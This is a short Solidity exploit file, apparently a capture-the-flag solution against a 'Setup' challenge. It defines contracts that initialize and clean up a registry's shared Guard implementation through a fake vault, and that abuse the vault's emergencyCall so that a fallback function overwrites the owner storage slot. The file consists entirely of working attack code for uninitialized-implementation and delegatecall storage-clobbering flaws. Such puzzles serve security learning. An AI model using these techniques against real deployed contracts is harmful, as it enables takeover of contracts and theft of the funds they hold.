pragma solidity 0.4.16;

import "public/Setup.sol";

contract FakeVault {
    Guard public guard;

    function FakeVault(GuardRegistry registry) public {
        guard = Guard(registry.implementations(registry.defaultImplementation()));
    }
    
    function cleanup() public {
        guard.initialize(Vault(address(this)));
        guard.cleanup();
    }

    function owner() public returns (address) {
        return address(this);
    }
}

contract OwnershipTaker {
    address public owner;

    function() public payable {
        owner = address(0x00);
    }
}

contract Exploit {
    Setup private setup;

    function Exploit(Setup setup_) public {
        setup = setup_;
    }

    function part1() public {
        FakeVault fakeVault = new FakeVault(setup.registry());
        fakeVault.cleanup();
    }

    function part2() public {
        OwnershipTaker taker = new OwnershipTaker();
        setup.vault().emergencyCall(address(taker), hex"");
    }
}